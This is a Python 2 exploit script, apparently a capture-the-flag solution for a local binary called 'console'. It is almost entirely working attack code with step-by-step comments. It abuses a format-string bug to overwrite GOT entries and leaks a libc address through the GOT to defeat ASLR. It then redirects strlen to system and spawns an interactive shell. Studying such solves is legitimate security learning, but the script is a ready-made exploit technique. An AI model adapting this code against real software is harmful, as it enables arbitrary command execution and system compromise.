from subprocess import PIPE, Popen
import struct

"""
my solve based on the previous solve
a little bit more claver and explained
also not using pwntools
"""

# $ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep fgets
FGETS_OFFSET  = 0x6dad0
# $ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
SYSTEM_OFFSET = 0x45390
# $ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep strlen
STRLEN_OFFSET = 0x8b720
# $ readelf -r ./console | grep fgets
FGETS_GOT     = 0x601230
# $ readelf -r ./console | grep exit
EXIT_GOT      = 0x601258
# $ readelf -r ./console | grep strlen
STRLEN_GOT    = 0x601210
# $ objdump -t ./console | grep loop
LOOP          = 0x4009bd

class ConsoleSolver:
    def __init__(self, argv):
        self.proc = Popen(argv, stdin=PIPE, stdout=PIPE)

    def recvuntil(self, delimiter):
        buf = ""
        while not buf.endswith(delimiter):
            buf += self.proc.stdout.read(1)
        return buf
        
    def sendline(self, buff):
        self.proc.stdin.write(buff+'\n')

    def patch_memory(self, address, content):
        data  = 'exit'.ljust(8)
        # correct amount of chars printer so far to match the content
        data += ('%%%dx' % (content+len(str(content))-10)).rjust(8)
        # refer to 17th stack argument (the address)
        # wrote to its lower 2bytes the amount of chars printer so far
        data += '|%17$hn|'
        # 64-bit little-endian
        data += struct.pack("<Q",address)
        
        self.sendline(data)
        self.recvuntil("Config action:")
        
    def leak_memory(self, address):
        data  = 'exit'.ljust(8)
        # 8 space so it will align just like in patch_memory
        # and I wont need to recalculate everything
        data += ''.rjust(8)
        # refer to 17th stack argument (the address)
        # print the content of the address as a string
        data += '|%17$s| '
        # 64-bit little-endian
        data += struct.pack("<Q",address)
        self.sendline(data)
        
        ans   = self.recvuntil("Config action:")
        # find the address between the '|'s
        ans   = ans[ans.index('|')+1:]
        ans   = ans[:ans.index('|')]
        # pad \x00 on the right
        ans   = ans+'\x00'*(8-len(ans))
        
        # 64-bit little-endian string to hex address
        return hex(struct.unpack("<Q",ans)[0])

if __name__ == "__main__":
    solver = ConsoleSolver(['./console','./temp.log'])
    solver.recvuntil("Config action:")
    # replace the address of exit in the GOT to the address of loop
    solver.patch_memory(EXIT_GOT, LOOP & 0xffff)
    
    # leak the content of known GOT entry to calculate libc location (ASLR change it every time)
    FGETS_LIBC  = solver.leak_memory(FGETS_GOT)
    LIBC_BASE   = hex(int(FGETS_LIBC, 16) - FGETS_OFFSET)
    SYSTEM_LIBC = hex(int(LIBC_BASE , 16) + SYSTEM_OFFSET)
    STRLEN_LIBC = hex(int(LIBC_BASE , 16) + STRLEN_OFFSET)

    print("system:     %s" % SYSTEM_LIBC)
    print("strlen:     %s" % STRLEN_LIBC)
    print("libc:       %s" % LIBC_BASE)
    
    # use strlen at least one time so the GOT will containt its address
    #   and we will be able to overwrite its lower-4 bytes
    solver.sendline("prompt asdf")
    solver.recvuntil("Config action:")
    
    # recreate system address
    WRITELO =  int(hex(int(SYSTEM_LIBC, 16) & 0xffff), 16)
    WRITEHI = int(hex((int(SYSTEM_LIBC, 16) & 0xffff0000) >> 16), 16)
    
    # replace the address of strlen in the GOT to the address of system
    solver.patch_memory(STRLEN_GOT  , WRITELO)
    solver.patch_memory(STRLEN_GOT+2, WRITEHI)
    
    # make sure that strlen now points to system
    STRLEN_LIBC_UPDATED  = solver.leak_memory(STRLEN_GOT)
    assert STRLEN_LIBC_UPDATED == SYSTEM_LIBC, "new_strlen: %s" % STRLEN_LIBC_UPDATED
    
    # call system with sh to open shell, then:
    # read shell command from user and print the output after the exit command
    solver.sendline("prompt sh")
    cmd = raw_input()
    while cmd != "exit":
        solver.sendline(cmd)
        cmd = raw_input()
    # little hack to know when the user done and until what word to read
    # its unlikely that all the abc upper-case in a row will be in the output
    solver.sendline('echo ABCDEFGHIJKLMNOPQRSTUVWXYZ')
    print solver.recvuntil('ABCDEFGHIJKLMNOPQRSTUVWXYZ')[:-len('ABCDEFGHIJKLMNOPQRSTUVWXYZ')]